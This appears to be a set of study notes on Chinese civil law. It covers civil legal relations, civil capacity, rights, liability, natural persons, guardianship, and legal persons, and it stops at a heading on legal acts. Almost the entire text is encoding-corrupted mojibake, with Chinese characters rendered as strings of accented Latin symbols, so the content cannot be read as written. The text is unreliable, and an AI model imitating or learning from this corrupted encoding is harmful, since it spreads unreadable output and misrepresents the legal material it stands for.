æ°‘äº‹æ³•å¾‹å…³ç³»çš„æ„æˆï¼šä¸»ä½“ã€å®¢ä½“ã€å†…å®¹ æ°‘äº‹æ³•å¾‹å…³ç³»çš„ä¸»ä½“ï¼šæŒ‡å‚ä¸æ°‘äº‹æ³•å¾‹å…³ç³»äº«æœ‰æ°‘äº‹æƒåˆ©æ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„æ³•å¾‹èµ„æ ¼ï¼Œæˆ–æŒ‡äº«æœ‰æ°‘äº‹æƒåˆ©èƒ½åŠ›çš„äººã€‚ æ°‘äº‹æ³•å¾‹å…³ç³»çš„å®¢ä½“ï¼šæŒ‡æ°‘äº‹æ³•å¾‹å…³ç³»çš„ä¸»ä½“äº«æœ‰çš„æƒåˆ©å’Œæ‰¿æ‹…çš„ä¹‰åŠ¡æ‰€æŒ‡å‘çš„äº‹ç‰©ã€‚ æ°‘äº‹æ³•å¾‹å…³ç³»çš„å†…å®¹ï¼šæŒ‡æ°‘äº‹æ³•å¾‹å…³ç³»çš„ä¸»ä½“æ‰€äº«æœ‰çš„æ°‘äº‹æƒåˆ©å’Œè´Ÿæœ‰çš„æ°‘äº‹ä¹‰åŠ¡ã€‚ æ°‘äº‹æ³•å¾‹å…³ç³»çš„äº‹å®ï¼šæ°‘äº‹æ³•å¾‹äº‹å®ï¼ŒæŒ‡ä¾æ³•èƒ½å¤Ÿå¼•èµ·æ°‘äº‹æ³•å¾‹å…³ç³»å‘ç”Ÿã€å˜æ›´ã€æ¶ˆç­çš„å®¢è§‚æƒ…å†µã€‚  æ ¹æ®æ˜¯å¦ä¸äººçš„æ„å¿—æœ‰å…³ï¼Œå¯å°†æ°‘äº‹æ³•å¾‹äº‹å®åŒºåˆ†ä¸ºè‡ªç„¶äº‹å®ä¸è¡Œä¸ºã€‚    ç¬¬3èŠ‚ æ°‘äº‹èƒ½åŠ› #   æ°‘äº‹æƒåˆ©èƒ½åŠ›çš„æ¦‚å¿µï¼šæ ¹æ®ä»¥å……å½“æ°‘äº‹ä¸»ä½“ï¼Œäº«å—æ°‘äº‹æƒåˆ©å’Œæ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„æ³•å¾‹åœ°ä½æˆ–æ³•å¾‹èµ„æ ¼ã€‚ æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼šæŒ‡æ°‘äº‹ä¸»ä½“æ ¹æ®ä»¥ç‹¬ç«‹å‚åŠ æ°‘äº‹æ³•å¾‹å…³ç³»ï¼Œä»¥è‡ªå·±çš„æ³•å¾‹è¡Œä¸ºå–å¾—æ°‘äº‹æƒåˆ©æˆ–æ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„æ³•å¾‹èµ„æ ¼ã€‚  æ„æ€èƒ½åŠ›ï¼šæŒ‡è‡ªç„¶äººè®¤è¯†è‡ªå·±çš„è¡Œä¸ºçš„åŠ¨æœºä¸ç»“æœï¼Œå¹¶æ ¹æ®æ­¤è®¤è¯†å†³å®šå…¶æ­£å¸¸çš„æ„æ€ä¹‹èƒ½åŠ›ã€‚æ„æ€èƒ½åŠ›ä¸ºæ³•å¾‹èµ‹äºˆè‡ªç„¶äººæ°‘äº‹è¡Œä¸ºèƒ½åŠ›ä¹‹å‰æã€‚   æ°‘äº‹è´£ä»»èƒ½åŠ›ï¼šæŒ‡æ°‘äº‹ä¸»ä½“æ®ä»¥ç‹¬ç«‹æ‰¿æ‹…æ°‘äº‹è´£ä»»çš„æ³•å¾‹åœ°ä½æˆ–æ³•å¾‹èµ„æ ¼ æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ä¸æ°‘äº‹è´£ä»»èƒ½åŠ›æ¯”è¾ƒï¼š  ç›®çš„ä¸åŒï¼Œæ°‘äº‹è¡Œä¸ºèƒ½åŠ›çš„ç›®çš„åœ¨äºä½¿ä¸»ä½“å¯ä»¥æŒ‰ç…§è‡ªå·±çš„æ„æ€è¿½æ±‚è‡ªèº«åˆ©ç›Šï¼Œæ°‘äº‹è´£ä»»èƒ½åŠ›çš„ç›®çš„åˆ™åœ¨äºå¯¹ä¸»ä½“çš„è¿æ³•è¡Œä¸ºè¿½ç©¶æ°‘äº‹è´£ä»»ï¼Œä¿æŠ¤ä»–äººå’Œç¤¾ä¼šåˆ©ç›Šï¼› æ•ˆåŠ›ä¸åŒï¼Œæ°‘äº‹è¡Œä¸ºèƒ½åŠ›ä¸ºå†³å®šæ°‘äº‹æ³•å¾‹è¡Œä¸ºæ˜¯å¦æœ‰æ•ˆçš„æ ¹æ®ï¼Œæ°‘äº‹è´£ä»»èƒ½åŠ›ä¸ºå†³å®šä¸»ä½“æ˜¯å¦è‡ªå·±æ‰¿æ‹…æ°‘äº‹è´£ä»»çš„æ ¹æ®ï¼› æ€§è´¨ä¸åŒï¼Œæ°‘äº‹è¡Œä¸ºèƒ½åŠ›æ˜¯å…·ä½“çš„ï¼Œæœ‰ä¸€å®šèŒƒå›´ï¼›æ°‘äº‹è´£ä»»èƒ½åŠ›æ˜¯æŠ½è±¡çš„ï¼Œæ— ä¸€å®šèŒƒå›´ã€‚    ç¬¬4èŠ‚ æ°‘äº‹æƒåˆ© #   æ°‘äº‹æƒåˆ©çš„ç‰¹ç‚¹  æ°‘äº‹æƒåˆ©æ˜¯ä¸€ç§ç”±æ°‘æ³•ç¡®å®šçš„æƒåˆ©ï¼› æ°‘äº‹æƒåˆ©æ˜¯ç”±æ°‘äº‹ä¸»ä½“äº«æœ‰çš„ä¸€ç§æƒåˆ©ï¼› æ°‘äº‹æƒåˆ©ä½“ç°ä¸ºæ°‘äº‹ä¸»ä½“ä¸€å®šèŒƒå›´å†…çš„è¡Œä¸ºè‡ªç”±ï¼› æƒåˆ©åœ¨æ€§è´¨ä¸Šæ˜¯ä¸€ç§æ³•å¾‹ä¹‹ä¸Šçš„åŠ›ï¼› æƒåˆ©æ˜¯ç±»å‹åŒ–çš„åˆ©ç›Šã€‚   æƒåˆ©çš„åˆ†ç±»  æ ¹æ®ï¼šå…¬æƒã€ç§æƒã€‚ æ ‡çš„ï¼šè´¢äº§æƒï¼ˆå¯ä»¥ä¸æƒåˆ©äººçš„äººæ ¼ã€èº«ä»½ç›¸åˆ†ç¦»è€Œå…·æœ‰è´¢äº§ä»·å€¼çš„æƒåˆ©ï¼‰ã€éè´¢äº§æƒã€‚ ä½œç”¨ï¼šæ”¯é…æƒã€è¯·æ±‚æƒã€å½¢æˆæƒï¼ˆæŒ‡å½“äº‹äººä¸€æ–¹ä¾æ®è‡ªå·±çš„è¡Œä¸ºï¼Œæ˜¯è‡ªå·±ä¸ä»–äººæ³•å¾‹å…³ç³»å‘ç”Ÿå˜åŠ¨çš„æƒåˆ©ã€‚å½¢æˆæƒçš„è¡Œä½¿ä¸å¾—é™„æ¡ä»¶æˆ–é™„æœŸé™ï¼Œå…¶è¡Œä½¿ä¸å¾—æ’¤é”€ï¼‰ã€æŠ—è¾©æƒï¼ˆæƒåˆ©äººç”¨ä»¥å¯¹æŠ—ä»–äººè¯·æ±‚æƒæˆ–å¦è®¤å¯¹æ–¹æƒåˆ©ä¸»å¼ çš„æƒåˆ©ï¼‰ æ•ˆåŠ›æ‰€åŠèŒƒå›´ï¼šç»å¯¹æƒï¼ˆå¯¹ä¸–æƒï¼‰ã€ç›¸å¯¹æƒï¼ˆå¯¹äººæƒï¼‰ ç›¸äº’å…³ç³»ï¼šä¸»æƒåˆ©ã€ä»æƒåˆ© ä¸æƒåˆ©ä¸»ä½“å…³ç³»ï¼šä¸“å±æƒã€éä¸“å±æƒ æ˜¯å¦å…·å¤‡å…¨éƒ¨æˆç«‹æ¡ä»¶ï¼šæ—¢å¾—æƒã€æœŸå¾…æƒ   æ°‘äº‹æƒåˆ©çš„å–å¾—  æ°‘äº‹æƒåˆ©çš„åŸå§‹å–å¾—ï¼šæŒ‡æ°‘äº‹æƒåˆ©ç‹¬ç«‹åœ°ã€ä¸ä¾é™„ä¸æ—¢å­˜ä¹‹å…¶ä»–æƒåˆ©è€Œå‘ç”Ÿ æ°‘äº‹æƒåˆ©çš„ç»§å—å–å¾—ï¼šåŸºäºä»–äººæ—¢å­˜æƒåˆ©è€Œå‘ç”Ÿæƒåˆ©ï¼Œæˆ–ç§°ä¸ºæ°‘äº‹æƒåˆ©çš„ä¼ æ¥å–å¾—ã€‚åˆ†ä¸ºè½¬ç§»çš„ç»§å—å–å¾—ä¸è®¾å®šçš„ç»§å—å–å¾—ã€‚   æ°‘äº‹æƒåˆ©çš„å˜æ›´  æ°‘äº‹æƒåˆ©ä¸»ä½“ä¹‹å˜æ›´ æ°‘äº‹æƒåˆ©å†…å®¹ä¹‹å˜æ›´   æ°‘äº‹æƒåˆ©çš„æ¶ˆç­ï¼šåˆ†ä¸ºç»å¯¹æ¶ˆç­ä¸ç›¸å¯¹æ¶ˆç­ æ°‘äº‹æƒåˆ©çš„ä¿æŠ¤ï¼š  æ°‘äº‹æƒåˆ©çš„è‡ªæˆ‘ä¿æŠ¤ï¼Œæˆ–ç§°ä¸ºæ°‘äº‹æƒåˆ©çš„ç§åŠ›æ•‘æµï¼šæŒ‡æƒåˆ©äººè‡ªå·±é‡‡å–å„ç§åˆæ³•æ‰‹æ®µæ¥ä¿æŠ¤è‡ªå·±çš„æƒåˆ©ä¸å—ä¾µçŠ¯ã€‚åŒ…æ‹¬ï¼šæ­£å½“é˜²å«ã€ç´§æ€¥é¿é™©ã€è‡ªåŠ©è¡Œä¸ºã€‚ æ°‘äº‹æƒåˆ©çš„å›½å®¶ä¿æŠ¤ï¼Œåˆç§°å…¬åŠ›æ•‘æµï¼šæŒ‡æƒåˆ©å—åˆ°ä¾µçŠ¯æ˜¯ï¼Œç”±å›½å®¶æœºå…³ç»™äºˆä¿æŠ¤ã€‚ç¡®è®¤ä¹‹è¯‰ã€ç»™ä»˜ä¹‹è¯‰ã€å½¢æˆä¹‹è¯‰ã€‚   æƒåˆ©ç«åˆ  ç¬¬6èŠ‚ æ°‘äº‹è´£ä»» #   æ°‘äº‹è´£ä»»çš„æœ¬è´¨ï¼š  æ°‘äº‹è´£ä»»ä¸ºæ°‘äº‹æ³•å¾‹æ„æˆä¹‹è¦ç´  æ°‘äº‹è´£ä»»ä½¿æ°‘äº‹æƒåˆ©å…·æœ‰æ³•å¾‹ä¹‹ä¸Šçš„åŠ› æ°‘äº‹æƒåˆ©æ˜¯è¿æ¥æ°‘äº‹æƒåˆ©ä¸å›½å®¶å…¬æƒåŠ›ä¹‹ä¸­ä»‹ æ°‘äº‹è´£ä»»æ˜¯ä¸€ç§ç‰¹åˆ«å€º   æ°‘äº‹è´£ä»»ä¸å…¶ä»–æ³•å¾‹è´£ä»»çš„åŒºåˆ«     å†…å®¹ æ°‘äº‹è´£ä»» å…¶ä»–è´£ä»»     äº§ç”Ÿæ ¹æ® æ³•å®šæˆ–çº¦å®š æ³•å®š   æ³•å¾‹å¼ºåˆ¶ç¨‹åº¦ æƒåˆ©äººè‡ªä¸»å†³å®šè¿½ç©¶æˆ–å…é™¤ ç”±å›½å®¶æœºå…³å¼ºåˆ¶è¿½ç©¶ï¼Œéç»æ³•å®šç¨‹åºä¸å¾—å…é™¤   ç›®çš„å’Œæ€§è´¨ ä»¥å¡«è¡¥æŸå®³ä¸ºç›®çš„ï¼Œè¡¥å¿æ€§ ä»¥é¢„é˜²ä¸ºç›®çš„ï¼Œå…·æœ‰æƒ©ç½šæ€§   æ„æˆè¦ä»¶ æ—¢æœ‰è¿‡é”™è´£ä»»ä¹Ÿæœ‰éè¿‡é”™è´£ä»» è´£ä»»äººå‡é¡»æœ‰è¿‡é”™   â†’ ä¸€èˆ¬è¦æ±‚æŸå®³äº‹å®å‘ç”Ÿ ä¸è¦æ±‚å®é™…æŸå®³å‘ç”Ÿ   â†’ å­˜åœ¨æ›¿ä»£è´£ä»» è´£ä»»è‡ªè´Ÿ     ä¸€äº›è´£ä»»çš„æ¦‚å¿µï¼š  å…±åŒè´£ä»»ï¼šå¯ä»¥åˆ†ä¸ºæŒ‰ä»½è´£ä»»ã€è¿å¸¦è´£ä»»å’Œè¡¥å……è´£ä»» æŒ‰ä»½è´£ä»»ï¼šæŒ‡å¤šæ•°å½“äº‹äººæŒ‰ç…§æ³•å¾‹çš„è§„å®šæˆ–è€…åˆåŒçš„çº¦å®šå„è‡ªæ‰¿æ‹…ä¸€å®šä»½é¢çš„æ°‘äº‹è´£ä»»ï¼Œå„è´£ä»»äººä¹‹é—´æ²¡æœ‰è¿å¸¦å…³ç³»ã€‚ è¿å¸¦è´£ä»»ï¼šå› è¿åè¿å¸¦å€ºåŠ¡æˆ–è€…å…±åŒäº‹å®ä¾µæƒè¡Œä¸ºè€Œäº§ç”Ÿçš„è´£ä»»ï¼Œå„ä¸ªè´£ä»»äººä¹‹é—´å…·æœ‰è¿å¸¦å…³ç³»ã€‚ è¡¥å……è´£ä»»ï¼šæŒ‡è´£ä»»äººçš„è´¢äº§ä¸è¶³ä»¥æ‰¿æ‹…å…¶åº”è´Ÿçš„æ°‘äº‹è´£ä»»æ—¶ï¼Œæœ‰æœ‰å…³çš„äººå¯¹ä¸è¶³çš„éƒ¨åˆ†ä¾æ³•è¯­ä¹‰è¡¥å……çš„è´£ä»»ã€‚ ä¸çœŸæ­£è¿å¸¦è´£ä»»ï¼šæŒ‡å„å€ºåŠ¡äººåŸºäºä¸åŒçš„å‘ç”ŸåŸå› è€Œå¯¹äºåŒä¸€å€ºæƒäººè´Ÿæœ‰ä»¥åŒä¸€ç»™ä»˜ä¸ºæ ‡çš„çš„æ•°ä¸ªå€ºåŠ¡ï¼Œå› ä¸€ä¸ªå€ºåŠ¡äººçš„å±¥è¡Œè€Œä½¿å…¨ä½“å€ºåŠ¡å‡å½’äºæ¶ˆç­ï¼Œæ­¤æ—¶æ•°ä¸ªå€ºåŠ¡äººä¹‹é—´æ‰€è´Ÿçš„è´£ä»»å³ä¸ºä¸çœŸæ­£è¿å¸¦è´£ä»»ã€‚    ç¬¬3ç«  æ°‘äº‹ä¸»ä½“ï¼ˆè‡ªç„¶äººï¼‰ #  ç¬¬2èŠ‚ äººæ ¼æƒ #   äººæ ¼æƒï¼šæŒ‡å­˜åœ¨äºæƒåˆ©äººè‡ªèº«äººæ ¼ä¸Šçš„æƒåˆ©ï¼Œäº¦å³ä»¥æƒåˆ©äººè‡ªèº«çš„äººæ ¼åˆ©ç›Šä¸ºæ ‡çš„ä¹‹æƒåˆ©ã€‚äººæ ¼æƒä¸å¾—è½¬è®©ä¸æ”¾å¼ƒã€‚  ç¬¬3èŠ‚ æ°‘äº‹è¡Œä¸ºèƒ½åŠ› #   æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼šè‡ªç„¶äººèƒ½ä»¥è‡ªå·±çš„è¡Œä¸ºäº«æœ‰æ°‘äº‹æƒåˆ©ã€æ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„èµ„æ ¼ã€‚ å®Œå…¨æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼šè‡ªç„¶äººå…·æœ‰çš„å®Œå…¨ç‹¬ç«‹åœ°é€šè¿‡è‡ªå·±çš„è¡Œä¸ºå–å¾—æ°‘äº‹æƒåˆ©å’Œæ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„èµ„æ ¼ã€‚åŒ…æ‹¬ï¼š  18å‘¨å²ä»¥ä¸Šçš„æˆå¹´äºº 16å‘¨å²ä»¥ä¸Šä¸æ»¡18å²ï¼Œä»¥è‡ªå·±çš„åŠ³åŠ¨æ”¶å…¥ä¸ºä¸»è¦ç”Ÿæ´»æ¥æºï¼Œå¹¶èƒ½ç»´æŒå½“åœ°ç¾¤ä¼—ä¸€èˆ¬ç”Ÿæ´»æ°´å¹³çš„è‡ªç„¶äºº   é™åˆ¶æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼šæŒ‡è‡ªç„¶äººå…·æœ‰çš„å¯ä»¥é€šè¿‡è‡ªå·±çš„è¡Œä¸ºå–å¾—éƒ¨åˆ†æ°‘äº‹æƒåˆ©å’Œæ‰¿æ‹…éƒ¨åˆ†æ°‘äº‹ä¹‰åŠ¡çš„èµ„æ ¼ã€‚é™åˆ¶æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººï¼Œå¯ä»¥è¿›è¡Œä¸å…¶å¹´é¾„ã€æ™ºåŠ›æˆ–ç²¾ç¥å¥åº·çŠ¶å†µç›¸é€‚åº”çš„æ°‘äº‹æ´»åŠ¨ï¼›å…¶ä»–æ°‘äº‹æ´»åŠ¨ç”±å…¶æ³•å®šä»£ç†äººä»£ç†ï¼Œæˆ–è€…å¾å¾—å…¶æ³•å®šä»£ç†äººçš„åŒæ„ã€‚åŒ…æ‹¬ï¼š  10å‘¨å²ä»¥ä¸Šçš„æœªæˆå¹´äºº ä¸èƒ½å®Œå…¨è¾¨è®¤è‡ªå·±è¡Œä¸ºçš„ç²¾ç¥ç—…äººï¼ˆåŒ…æ‹¬ç—´å‘†äººï¼‰   æ— æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼šæŒ‡è‡ªç„¶äººä¸å…·æœ‰è‡ªå·±çš„è¡Œä¸ºå–å¾—æ°‘äº‹æƒåˆ©å’Œæ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„èµ„æ ¼ã€‚æ— æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººçš„æ°‘äº‹è¡Œä¸ºï¼Œåº”ç”±å…¶æ³•å®šä»£ç†äººè¿›è¡Œã€‚åŒ…æ‹¬å¦‚ä¸‹ä¸¤ç±»è‡ªç„¶äººã€‚åŒ…æ‹¬ï¼š  ä¸æ»¡10å‘¨å²çš„æœªæˆå¹´äººï¼› ä¸èƒ½è¾¨è®¤è‡ªå·±è¡Œä¸ºçš„ç²¾ç¥ç—…äººã€‚    ç¬¬4èŠ‚ ç›‘æŠ¤ #   ç›‘æŠ¤ï¼šæŒ‡ä¸ºæ— æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººå’Œé™åˆ¶æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººè®¾ç½®ä¿æŠ¤äººï¼Œä»¥ç›‘ç£å’Œä¿æŠ¤å…¶äººèº«ã€è´¢äº§ä»¥åŠå…¶ä»–åˆæ³•æƒç›Šçš„åˆ¶åº¦ã€‚ç›‘æŠ¤ç‰¹ç‚¹å¦‚ä¸‹ï¼š  è¢«ç›‘æŠ¤äººåªèƒ½æ˜¯æ— æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººå’Œé™åˆ¶æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººã€‚ ç›‘æŠ¤äººåªèƒ½æ˜¯å®Œå…¨æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººå’Œæœ‰ç›‘æŠ¤æ¡ä»¶çš„ç»„ç»‡ã€‚ ç›‘æŠ¤çš„ç›®çš„ï¼Œåœ¨äºå¼¥è¡¥æ— æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººå’Œé™åˆ¶æ°‘äº‹è¡Œä¸ºèƒ½åŠ›äººåœ¨æ°‘äº‹è¡Œä¸ºæ–¹é¢çš„ä¸è¶³æˆ–ç¼ºé™·ã€‚   åè®®ç›‘æŠ¤ä¸å§”æ‰˜ç›‘æŠ¤  åè®®ç›‘æŠ¤ï¼Œæ˜¯æŒ‡ç”±æœ‰ç›‘æŠ¤èµ„æ ¼çš„äººåå•†ç¡®å®šç›‘æŠ¤äººçš„ç›‘æŠ¤ã€‚æœ‰ç›‘æŠ¤èµ„æ ¼çš„äººä¹‹é—´åè®®ç¡®å®šç›‘æŠ¤äººçš„ï¼Œåº”å½“ç”±åè®®ç¡®å®šçš„ç›‘æŠ¤äººå¯¹è¢«ç›‘æŠ¤äººæ‰¿æ‹…è´£ä»»ã€‚ å§”æ‰˜ç›‘æŠ¤ï¼Œæ˜¯æŒ‡ç›‘æŠ¤äººå°†ç›‘æŠ¤èŒè´£å§”æ‰˜ç»™ä»–äººæ‰€äº§ç”Ÿçš„ç›‘æŠ¤ã€‚ç›‘æŠ¤äººå¯ä»¥å°†ç›‘æŠ¤è´£ä»»éƒ¨åˆ†æˆ–å…¨éƒ¨å§”æ‰˜ç»™ä»–äººã€‚å› è¢«ç›‘æŠ¤äººçš„ä¾µæƒè¡Œä¸ºéœ€è¦æ‰¿æ‹…æ°‘äº‹è´£ä»»çš„ï¼Œåº”å½“ç”±ç›‘æŠ¤äººæ‰¿æ‹…ï¼Œä½†å½“äº‹äººå¦æœ‰çº¦å®šçš„é™¤å¤–ã€‚åªæœ‰åœ¨è¢«å§”æ‰˜äººç¡®æœ‰è¿‡é”™çš„æƒ…å†µä¸‹ï¼Œæ‰è´Ÿè¿å¸¦è´£ä»»ã€‚    ç¬¬5èŠ‚ å®£å‘Šå¤±è¸ªåˆ¶åº¦ #   å®£å‘Šå¤±è¸ªï¼šæŒ‡ç»åˆ©å®³å…³ç³»äººç”³è¯·ï¼Œç”±æ³•é™¢å¯¹ä¸‹è½ä¸æ˜æ»¡ä¸€å®šæœŸé™çš„è‡ªç„¶äººå®£å‘Šä¸ºå¤±è¸ªäººçš„åˆ¶åº¦ã€‚ å®£å‘Šå¤±è¸ªçš„æ¡ä»¶ï¼Œæ³•å¾‹åæœï¼Œæ’¤é”€  ç¬¬6èŠ‚ å®£å‘Šæ­»äº¡åˆ¶åº¦ #   å®£å‘Šæ­»äº¡ï¼šæŒ‡è‡ªç„¶äººä¸‹è½ä¸æ˜è¾¾åˆ°æ³•å®šæœŸé™ï¼Œç»åˆ©å®³å…³ç³»äººç”³è¯·ï¼Œç”±æ³•é™¢å®£å‘Šå…¶æ­»äº¡çš„åˆ¶åº¦ã€‚ å®£å‘Šæ­»äº¡çš„æ¡ä»¶ï¼Œæ³•å¾‹åæœï¼Œæ’¤é”€ã€‚  ç¬¬4ç«  æ°‘äº‹ä¸»ä½“ï¼ˆæ³•äººï¼‰ #  ç¬¬1èŠ‚ æ³•äººçš„æ¦‚å¿µ #   æ³•äººï¼šæ˜¯æŒ‡å…·æœ‰æ°‘äº‹æƒåˆ©èƒ½åŠ›å’Œæ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼Œä¾æ³•ç‹¬ç«‹äº«æœ‰æ°‘äº‹æƒåˆ©å’Œæ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„ç»„ç»‡ã€‚æ³•äººçš„æ°‘äº‹æƒåˆ©èƒ½åŠ›å’Œæ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼Œä»æ³•äººæˆç«‹æ—¶äº§ç”Ÿï¼Œåˆ°æ³•äººç»ˆæ­¢æ—¶æ¶ˆç­ã€‚ æ³•äººçš„ç‰¹å¾ï¼š  ç‹¬ç«‹çš„ç»„ç»‡ã€‚æ³•äººçš„æ°‘äº‹ä¸»ä½“èµ„æ ¼ä¸ç»„æˆæ³•äººçš„è‡ªç„¶äººçš„æ°‘äº‹ä¸»ä½“èµ„æ ¼å½¼æ­¤ç‹¬ç«‹ï¼ŒæŸä¸ªæˆ–æŸäº›æ³•äººæˆå‘˜çš„æ­»äº¡æˆ–é€€å‡ºæ³•äººç»„ç»‡ï¼Œä¸å½±å“æ³•äººçš„å­˜ç»­ï¼›æ³•äººçš„ç»„ç»‡æ— éœ€ä¾é å…¶ä»–ç»„ç»‡æˆ–å•ä½è€Œç‹¬ç«‹å­˜åœ¨ã€‚ ç‹¬ç«‹çš„è´¢äº§ã€‚æ³•äººæ‰€æœ‰æˆ–ç»è¥ç®¡ç†çš„å…¨éƒ¨è´¢äº§ç‹¬ç«‹äºå…¶å‡ºèµ„è€…çš„å…¶ä»–è´¢äº§ï¼Œæ³•äººäº«æœ‰ç‹¬ç«‹è´¢äº§æƒã€‚ ç‹¬ç«‹çš„è´£ä»»ã€‚æ³•äººä»¥è‡ªå·±çš„åä¹‰è¿›è¡Œæ°‘äº‹æ´»åŠ¨ï¼Œç‹¬ç«‹äº«æœ‰æ°‘äº‹æƒåˆ©æ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡ã€‚å¦‚æœæ³•äººè¿åæ°‘äº‹ä¹‰åŠ¡ï¼Œç”±æ³•äººç‹¬ç«‹æ‰¿æ‹…æ°‘äº‹è´£ä»»ã€‚æ³•äººçš„è´¢äº§ä¸è¶³ä»¥æ¸…å¿å€ºåŠ¡æ—¶ï¼Œæ³•äººå‡ºèµ„è€…ä¸€èˆ¬ä¸æ‰¿æ‹…è´£ä»»ã€‚    ç¬¬4èŠ‚ æ³•äººçš„æ°‘äº‹èƒ½åŠ› #   æ³•äººçš„æ°‘äº‹æƒåˆ©èƒ½åŠ›ï¼šæ˜¯æŒ‡æ³•äººä»¥è‡ªå·±çš„åä¹‰ç‹¬ç«‹äº«å—æ°‘äº‹æƒåˆ©å’Œè´Ÿæ‹…æ°‘äº‹ä¹‰åŠ¡çš„èµ„æ ¼ã€‚å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š  æ³•äººçš„æ°‘äº‹æƒåˆ©èƒ½åŠ›å§‹äºæˆç«‹ã€ç»ˆäºæ¶ˆç­ã€‚ æ³•äººæ°‘äº‹æƒåˆ©èƒ½åŠ›å—æ³•äººè‡ªç„¶å±æ€§çš„é™åˆ¶ã€‚æ³•äººæ˜¯ç¤¾ä¼šç»„ç»‡ï¼Œå…·æœ‰å›¢ä½“æ€§ï¼Œå› è€Œæ³•äººä¸äº«æœ‰è‡ªç„¶äººåŸºäºè‡ªç„¶å±æ€§æ‰€äº«æœ‰çš„æƒåˆ©ï¼Œå¦‚ç”Ÿå‘½æƒã€å¥åº·æƒç­‰ï¼Œå½“ç„¶æ³•äººä¹Ÿä¸å¯èƒ½äº«æœ‰å©šå§»èƒ½åŠ›ç­‰ã€‚ æ³•äººçš„æ°‘äº‹æƒåˆ©èƒ½åŠ›å—æ³•äººå®—æ—¨çš„é™åˆ¶ï¼Œä½†é™¤å›½å®¶é™åˆ¶ç»è¥ã€ç‰¹è®¸ç»è¥å’Œç¦æ­¢ç»è¥å¤–ï¼Œæ³•äººè¶…è¶Šå…¶ç»è¥èŒƒå›´çš„æ°‘äº‹è¡Œä¸ºå¹¶éä¸€å®šæ— æ•ˆã€‚   æ³•äººçš„æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼šæ˜¯æŒ‡æ³•äººé€šè¿‡è‡ªå·±çš„è¡Œä¸ºå–å¾—æ°‘äº‹æƒåˆ©å’Œæ‰¿æ‹…æ°‘äº‹ä¹‰åŠ¡çš„èµ„æ ¼ã€‚å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š  æ³•äººçš„æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼Œä¸å…¶æ°‘äº‹æƒåˆ©èƒ½åŠ›åŒæ—¶äº§ç”Ÿã€åŒæ—¶æ¶ˆç­ï¼Œåœ¨å­˜ç»­æ—¶é—´ä¸Šå…·æœ‰ä¸€è‡´æ€§ã€‚ æ³•äººçš„æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼Œä¸å…¶æ°‘äº‹æƒåˆ©èƒ½åŠ›åœ¨èŒƒå›´ä¸Šå…·æœ‰ä¸€è‡´æ€§ã€‚ æ³•äººçš„æ°‘äº‹è¡Œä¸ºèƒ½åŠ›ï¼Œæ˜¯é€šè¿‡æ³•å®šä»£è¡¨äººå’Œå…¶ä»–æ³•äººæœºå…³æˆå‘˜æ¥å®ç°çš„ã€‚   ä»£è¡¨è¯´ä¸ä»£ç†è¯´   æ³•äººçš„æ°‘äº‹è´£ä»»èƒ½åŠ›ï¼šæ˜¯æŒ‡æ³•äººå¯¹è‡ªå·±æ‰€ä¸ºçš„è¿æ³•è¡Œä¸ºæ‰¿æ‹…æ³•å¾‹è´£ä»»çš„èƒ½åŠ›æˆ–èµ„æ ¼ã€‚å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š  æ³•äººçš„è´£ä»»èƒ½åŠ›ä¸æ³•äººçš„æƒåˆ©èƒ½åŠ›åŒæ—¶äº§ç”Ÿã€åŒæ—¶æ¶ˆç­ï¼Œè€Œä¸”å…¶èŒƒå›´æ˜¯ä¸€è‡´çš„ã€‚ æ³•äººï¼Œåªå¯¹æ³•å®šä»£è¡¨äººã€æ³•äººæœºå…³åŠå·¥ä½œäººå‘˜åœ¨å…¶æƒåˆ©èƒ½åŠ›èŒƒå›´å†…æ‰€ä¸ºèŒåŠ¡è¿æ³•è¡Œä¸ºæ‰¿æ‹…æ°‘äº‹è´£ä»»ã€‚æ³•äººçš„è´£ä»»èƒ½åŠ›ï¼ŒåŒ…æ‹¬æ³•äººçš„è¿çº¦è´£ä»»èƒ½åŠ›å’Œæ³•äººçš„ä¾µæƒè´£ä»»èƒ½åŠ›ã€‚   æ³•äººæ‰¿æ‹…æ³•å¾‹è´£ä»»éœ€æ»¡è¶³ä»¥ä¸‹è¦ä»¶ï¼šé¡»æœ‰åŠ å®³ä»–äººçš„ä¾µæƒè¡Œä¸ºï¼›é¡»å› æ³•äººçš„ä»£è¡¨äººæˆ–å…¶ä»–å·¥ä½œäººå‘˜çš„è¡Œä¸ºï¼›é¡»å› æ‰§è¡ŒèŒåŠ¡çš„è¡Œä¸ºæ‰€å‘ç”Ÿã€‚  ç¬¬6ç«  æ³•å¾‹è¡Œä¸º #  ç¬¬1èŠ‚ æ³•å¾‹è¡Œä¸ºçš„æ¦‚å¿µ #   